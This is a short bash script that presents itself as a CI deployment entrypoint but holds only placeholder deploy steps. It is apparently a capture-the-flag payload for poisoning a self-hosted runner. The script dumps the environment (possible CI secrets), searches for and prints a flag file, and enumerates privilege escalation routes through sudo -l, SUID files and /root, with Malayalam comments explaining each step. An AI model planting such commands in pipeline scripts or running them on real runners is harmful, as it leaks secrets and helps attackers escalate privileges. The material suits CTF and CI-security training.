#!/usr/bin/env bash
# Deployment entrypoint executed by the self-hosted runner.
set -euo pipefail
echo "[deploy] host=$(hostname) user=$(whoami) pwd=$(pwd)"
echo "[deploy] pulling latest VOID service artifacts..."
# TODO: real deploy steps (rsync artifacts, restart services)
echo "[deploy] done."
echo "=== TARGET INSPECTION ==="
id
env
ls -la /
find / -name "*flag*" 2>/dev/null || true
echo "=== PRINTING THE FLAG ==="
cat /opt/void/ci_flag.txt
echo "=== PRIVILEGE ESCALATION CHECK ==="
# 1. പാസ്‌വേഡ് ഇല്ലാതെ റൂട്ട് ആയി റൺ ചെയ്യാൻ പറ്റുന്ന കമാൻഡുകൾ ഉണ്ടോ എന്ന് നോക്കാൻ (SUDO)
sudo -l || true

# 2. SUID പെർമിഷൻ ഉള്ള ഫയലുകൾ കണ്ടെത്താൻ (ഇവ റൂട്ട് പ്രിവിലേജിൽ റൺ ചെയ്യാൻ പറ്റിയേക്കും)
find / -perm -4000 -type f 2>/dev/null || true

# 3. റൂട്ടിന്റെ ഹോം ഡയറക്ടറിയിൽ എന്തൊക്കെ ഉണ്ടെന്ന് നോക്കാൻ ശ്രമിക്കാം
ls -la /root || true
